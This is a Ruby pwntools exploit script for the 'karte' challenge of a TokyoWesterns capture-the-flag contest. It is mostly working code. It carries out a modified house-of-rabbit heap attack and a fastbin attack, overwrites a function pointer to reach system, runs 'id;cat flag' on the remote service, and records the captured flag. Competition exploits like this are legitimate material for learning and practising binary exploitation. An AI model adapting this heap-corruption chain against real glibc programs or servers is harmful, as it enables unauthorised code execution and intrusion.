#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

host, port = 'karte.chal.ctf.westerns.tokyo', 10001
@local = false
@p = ''
if ARGV.empty?
  host = '127.0.0.1'; @local = true
  # $z = Tubes::Process.new(@p)
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new(host, port)
def z;$z;end
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
def libc; @libc ||= ELF.new('./libc.so.6'); end
def debug!; context.log_level = :debug; end
#================= Exploit Start ====================
context.arch = :amd64
# debug!

def pt; z.gets '> '; end

def putint(v)
  z.write v.to_s.ljust(31, "\x00")
end

def add(n, data = 'A')
  # log.dump n.hex
  pt
  putint(1)
  z.gets 'Input size > '
  putint(n)
  if n > 0
    # fail if data.size != n - 1
    z.write data
  end
  if @rnd_fucked
    z.write p64(0xddaa)
    return 0xddaa
  end
  z.gets 'Added id '
  z.gets.to_i
end

def del(id)
  pt
  putint(3)
  z.gets 'Input id > '
  putint(id)
end

def modify(id, data)
  pt
  putint(4)
  z.gets 'Input id > '
  putint(id)
  z.gets 'Input new description > '
  z.write data
end

def rename(name)
  pt
  putint(99)
  z.gets '... '
  z.write name
end

name_at = 0x6021a0
fake_at = name_at
z.gets '... '

# modified house-of-rabbit
z.write flat(0xffffffffffffffe0, 0x20,
             0, 0,
             0, 0xffffffffffffffe1,
             name_at + 0x20, name_at + 0x20
             )[0, 62]

del(add(0xa0000, 'A'))
del(add(0xa0000, 'A'))

7.times { del(add(0)) }
id1 = add(0x10)
id2 = add(0x10)
small = add(0x810, 'S')
del(id1)
del(id2)
# fastbin attack
modify(id2, p32(fake_at))

# consolidation!
del(small)
log.info 'consolidated'

rename(flat(0, 0, 0, 0, 0, 0xa0001))
id1 = add(0xa0000)
rename(flat(0, 0, 0xfffffffffffffff0, 0x11, 0, 0xfffffffffffffff1))

target = 0x602120
id2 = add(target - (name_at + 0x20) - 0x20)

# pause
@rnd_fucked = true
id3 = add(0x58, p64(0) * 6 + flat(0x123400000001, 0x602078, 0, 0) + p64(0x0000deadc0bebeef)[0, 7])
# printf is dead..
z.gets 'Done'
putint(4)
putint(0x1234)
# system
z.write p16(0xf440)

z.gets 'Done'
# 1/16
z.puts 'id;cat flag'
z.interact
# uid=40221 gid=40000(karte) groups=40000(karte)
# TWCTF{pr1n7l355_15_50_53cur3!}
